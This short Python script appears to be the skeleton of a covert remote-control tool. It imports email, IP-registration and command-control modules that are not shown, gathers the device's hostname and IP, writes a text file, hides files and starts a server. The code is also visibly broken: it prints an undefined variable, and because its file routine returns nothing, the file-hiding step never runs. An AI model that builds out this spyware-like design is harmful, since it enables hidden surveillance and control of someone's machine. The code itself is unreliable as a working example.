from SendEmailControl import *
from registerIP import *
from CmdControl import *


root = GetIpByDevice()
target = root


def capture_ip_device():
    target.get_hostname()
    if target:
        target.get_ip_address()


def wrt_read_txt():
    try:
        target.open_txt()
        target.write_txt()
        target.close_txt()
    except PermissionError:
        print(err)


def hide_file():
    target.hide_files()


if __name__ == '__main__':
    capture_ip_device()
    if wrt_read_txt():
        hide_file()
    try:
        start_server()
    except PermissionError as err:
        print(err)
